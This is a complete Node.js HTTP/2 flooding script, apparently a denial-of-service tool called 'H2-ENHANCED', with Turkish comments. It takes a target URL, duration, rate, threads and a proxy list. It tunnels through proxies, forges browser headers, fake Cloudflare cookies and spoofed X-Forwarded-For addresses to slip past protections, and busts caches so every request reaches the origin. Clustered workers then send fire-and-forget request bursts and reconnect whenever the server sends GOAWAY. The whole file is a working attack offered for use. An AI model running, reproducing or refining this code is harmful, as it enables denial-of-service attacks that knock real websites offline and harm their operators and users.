const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

// Error handling
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).setMaxListeners(0);

require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`Usage: node H2-ENHANCED.js [host] [time] [rps] [thread] [proxyfile]`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

// HTTPS-HIGH optimized ciphers (bypass için en iyi)
const cipherList = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384"
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

// H2-MONARCH: 30+ browser pool (en geniş)
const browserPool = [
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="99"' },
    { ua: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="132", "Google Chrome";v="132"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "macOS", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", platform: "Linux", mobile: "?0", ch: '"Chromium";v="133", "Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0", platform: "Windows", mobile: "?0", ch: "Firefox" },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.2; rv:135.0) Gecko/20100101 Firefox/135.0", platform: "macOS", mobile: "?0", ch: "Firefox" },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0", platform: "Windows", mobile: "?0", ch: '"Chromium";v="133", "Microsoft Edge";v="133"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15", platform: "macOS", mobile: "?0", ch: '"Safari";v="18"' },
    { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: '"Safari";v="19"' },
    { ua: "Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.54 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Google Chrome";v="133"' },
    { ua: "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0", platform: "Windows", mobile: "?0", ch: '"Opera";v="116"' },
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", platform: "macOS", mobile: "?0", ch: '"Safari";v="17"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/25.2.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Yandex";v="25"' },
    { ua: "Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Google Chrome";v="132"' },
    { ua: "Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: '"Safari";v="18"' }
];

// H2-MONARCH: Akıllı referer havuzu
const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://yandex.com.tr/",
    "https://www.reddit.com/",
    "https://t.co/",
    "https://www.facebook.com/",
    "https://www.instagram.com/"
];

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.clear();
    console.log(`[H2-ENHANCED] Ultimate Combined Method`.bgRed);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.red + args.target.white);
    console.log(`Time: `.red + args.time.white);
    console.log(`Rate: `.red + args.Rate.white);
    console.log(`Thread: `.red + args.threads.white);
    console.log(`ProxyFile: `.red + args.proxyFile.white);
    console.log(`--------------------------------------------`.gray);
    console.log(`Edit By Genisys`.brightCyan);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    // RPS Counter
    let currentSecondRequests = 0;
    let totalRequests = 0;
    let rpsHistory = [];

    cluster.on('message', (worker, message) => {
        if (message.type === 'rps') {
            currentSecondRequests += message.count;
            totalRequests += message.count;
        }
    });

    setInterval(() => {
        rpsHistory.push(currentSecondRequests);
        if (rpsHistory.length > 10) rpsHistory.shift();

        const avgRps = Math.floor(rpsHistory.reduce((a, b) => a + b, 0) / rpsHistory.length);
        console.log(`[RPS] Current: ${currentSecondRequests}/s | Average: ${avgRps}/s | Total: ${totalRequests}`);
        currentSecondRequests = 0;
    }, 1000);

    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);

} else {
    // H2-SAFARI technique: 15 paralel flooder + setInterval 1ms
    for (let i = 0; i < 15; i++) {
        setInterval(runFlooder, 1);
    }
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr) return;

    const [proxyHost, proxyPort] = proxyAddr.split(":");
    const connection = net.connect(parseInt(proxyPort), proxyHost);

    connection.setTimeout(10000);
    connection.setKeepAlive(true, 60000);

    connection.once("connect", () => {
        connection.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    connection.once("data", (chunk) => {
        if (!chunk.toString().includes("HTTP/1.1 200")) {
            connection.destroy();
            return;
        }

        const tlsConn = tls.connect({
            socket: connection,
            servername: parsedTarget.hostname,
            ALPNProtocols: ["h2"],
            ciphers: cipherList,
            sigalgs: sigalgs,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION
        });

        tlsConn.setTimeout(10000);

        tlsConn.once("secureConnect", () => {
            // H2-URA: EXTREME SETTINGS (32768 streams, 2GB window)
            const client = http2.connect(args.target, {
                createConnection: () => tlsConn,
                settings: {
                    headerTableSize: 65536,
                    enablePush: false,
                    maxConcurrentStreams: 32768,  // H2-URA extreme
                    initialWindowSize: 2147483647, // H2-URA: 2GB!
                    maxFrameSize: 16384,
                    maxHeaderListSize: 262144
                }
            });

            let streamCount = 0;
            let isGoingAway = false;

            // HTTPS-HIGH: GOAWAY handler
            client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                isGoingAway = true;
                // Immediate RST_STREAM for all active streams
                for (let i = 1; i <= streamCount; i += 2) {
                    try {
                        client.close();
                    } catch (e) {}
                }
                // Fast reconnect
                setImmediate(() => {
                    client.destroy();
                    connection.destroy();
                    runFlooder(); // Reconnect immediately
                });
            });

            client.on("error", () => {
                client.destroy();
                connection.destroy();
            });

            client.on("connect", () => {
                // HTTP/2 PING to keep alive
                const pingInterval = setInterval(() => {
                    if (!client.destroyed && !isGoingAway) {
                        client.ping((err) => {});
                    }
                }, 5000);

                // MAXIMUM THROTTLE: Fire-and-forget loop
                function sendRequests() {
                    if (client.destroyed || isGoingAway) {
                        clearInterval(pingInterval);
                        return;
                    }

                    let requestsSent = 0;

                    // H2-SAFARI: Batch requests for maximum RPS
                    for (let i = 0; i < args.Rate; i++) {
                        if (client.destroyed || isGoingAway) break;

                        // H2-MONARCH: Random browser from pool
                        const browser = randomElement(browserPool);
                        const isPost = Math.random() > 0.7;

                        // Cache bypass + random query
                        const cacheBust = crypto.randomBytes(8).toString("hex");
                        const queryString = `?cb=${cacheBust}&t=${Date.now()}&r=${randstr(6)}`;

                        // H2-MONARCH: Smart referer logic
                        let selectedReferer = randomElement(referers);
                        if (browser.ua.includes("YaBrowser")) {
                            selectedReferer = "https://yandex.com.tr/";
                        } else if (browser.ua.includes("Edg/")) {
                            selectedReferer = "https://www.bing.com/";
                        } else if (Math.random() > 0.5) {
                            selectedReferer = args.target; // same-origin
                        }

                        // H2-TSUNAMI: Long cookies for origin stress
                        const longCookie = `_cfuvid=${crypto.randomBytes(16).toString("hex")}; cf_clearance=${crypto.randomBytes(32).toString("hex")}; session_id=${crypto.randomBytes(24).toString("hex")}; _ga=GA1.1.${Math.floor(Math.random() * 999999999)}; _gid=GA1.1.${Math.floor(Math.random() * 999999999)}`;

                        const headers = {
                            ":method": isPost ? "POST" : "GET",
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": parsedTarget.path + queryString,
                            "user-agent": browser.ua,
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "cache-control": Math.random() > 0.5 ? "no-cache" : "max-age=0",
                            "referer": selectedReferer,
                            "sec-ch-ua": browser.ch,
                            "sec-ch-ua-mobile": browser.mobile,
                            "sec-ch-ua-platform": `"${browser.platform}"`,
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": selectedReferer.includes(parsedTarget.host) ? "same-origin" : "cross-site",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                            "cookie": longCookie,
                            "x-requested-with": "XMLHttpRequest",
                            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                            "pragma": "no-cache"
                        };

                        try {
                            const req = client.request(headers, {
                                weight: 220,
                                depends_on: 0,
                                exclusive: false
                            });

                            streamCount++;

                            if (isPost) {
                                const postData = JSON.stringify({
                                    timestamp: Date.now(),
                                    token: crypto.randomBytes(16).toString("hex"),
                                    data: randstr(64)
                                });
                                req.write(postData);
                            }

                            // Fire-and-forget: no response waiting
                            req.on("response", () => {
                                req.close();
                                req.destroy();
                            });

                            req.on("error", () => {
                                req.destroy();
                            });

                            req.end();
                            requestsSent++;

                        } catch (e) {
                            break;
                        }
                    }

                    // Report RPS to master
                    if (process.send) {
                        process.send({ type: 'rps', count: requestsSent });
                    }

                    // H2-SAFARI: setImmediate for maximum speed (no delay)
                    setImmediate(sendRequests);
                }

                // Start attack immediately
                sendRequests();

                // Auto-cleanup after 20 seconds
                setTimeout(() => {
                    clearInterval(pingInterval);
                    client.close();
                    connection.destroy();
                }, 20000);
            });
        });

        tlsConn.on("error", () => {
            tlsConn.destroy();
            connection.destroy();
        });
    });

    connection.on("error", () => {
        connection.destroy();
    });

    connection.on("timeout", () => {
        connection.destroy();
    });
}
